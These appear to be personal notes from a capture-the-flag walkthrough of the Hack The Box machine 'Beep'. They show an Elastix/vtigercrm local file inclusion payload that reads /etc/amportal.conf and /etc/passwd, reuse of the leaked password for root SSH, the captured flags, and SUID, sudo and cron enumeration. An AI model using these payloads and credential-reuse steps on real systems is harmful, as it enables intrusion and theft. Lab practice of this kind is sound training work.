We have a login page hosted on the default web page
Its running some kind of service named Elastix
Our first step should be to enumerate this web directory

I've found a few interesting things: 
```bash
/mail    (Status: 301) [Size: 316] [--> https://10.129.229.183/mail/]
/admin   (Status: 301) [Size: 317] [--> https://10.129.229.183/admin/]
/configs (Status: 301) [Size: 319] [--> https://10.129.229.183/configs/]
```

We have a login page for `/mail` and `/admin`

```
https://10.129.229.183/admin/config.php
```

In failing to login we are sent to `/admin/config.php` and we find some version info for `FreePBX version 2.8.1.4`

```
https://10.129.14.86/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

```
AMPDBPASS=jEhdIekWmdjE
```

```
view-source:https://10.129.14.86/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&module=Accounts&action
```

```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
distcache:x:94:94:Distcache:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
pcap:x:77:77::/var/arpwatch:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
dbus:x:81:81:System message bus:/:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
mailman:x:41:41:GNU Mailing List Manager:/usr/lib/mailman:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
spamfilter:x:500:500::/home/spamfilter:/bin/bash
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
fanis:x:501:501::/home/fanis:/bin/bash
Sorry! Attempt to access restricted file.
```

```
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 fanis@10.129.14.86
```

```
ssh -oKexAlgorithms=+diffie-hellman-group14-sha1 \
    -oHostKeyAlgorithms=+ssh-rsa \
    root@10.129.14.86

password: jEhdIekWmdjE
```

```
[root@beep ~]# whoami
root
```

```
[root@beep fanis]# cat user.txt 
1bdf5ba85c5eaf83b86cf0413ce21bdd
```

```
[root@beep ~]# cat root.txt 
c028dae6e9912565f145fc9776e3990f
```

---

# SUID's and PATH Hijacking 

```php
find / -perm -4000 -type f 2>/dev/null

/usr/bin/sperl5.8.8
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/crontab
/usr/bin/at
/usr/bin/chage
/usr/bin/sudoedit
/usr/bin/chfn
/usr/bin/newgrp

/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/libexec/mc/cons.saver
/usr/libexec/openssh/ssh-keysign
/usr/sbin/ccreds_validate
/usr/sbin/userhelper
/usr/sbin/suexec
/usr/sbin/usernetctl
/usr/kerberos/bin/ksu
/bin/mount
/bin/umount
/bin/su
/bin/ping
/bin/ping6
/lib/dbus-1/dbus-daemon-launch-helper
/sbin/pam_timestamp_check
/sbin/mount.nfs
/sbin/umount.nfs
/sbin/umount.nfs4
/sbin/mount.nfs4
/sbin/unix_chkpwd
```

A list of SUID binaries on beep
https://gtfobins.github.io/#cronta
Check what is vulnerable

```php
sudo -l

sudo -l
Matching Defaults entries for notdrew1 on htb-e0ligctgs4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/root/.local/bin

User notdrew1 may run the following commands on htb-e0ligctgs4:
    (ALL) NOPASSWD: ALL
```

```php
[root@beep fanis]# env -i /usr/bin/passwd
Changing password for user root.
New UNIX password: 
BAD PASSWORD: it is WAY too short
Retype new UNIX password: 
passwd: all authentication tokens updated successfully.
```

changed the root users password

```php
find / -type f -writable -exec ls -l {} \; 2>/dev/null | grep cron
```

No writable cron files were found on the machine

```php
crontab -l
no crontab for root
```

Let's create a fake binary

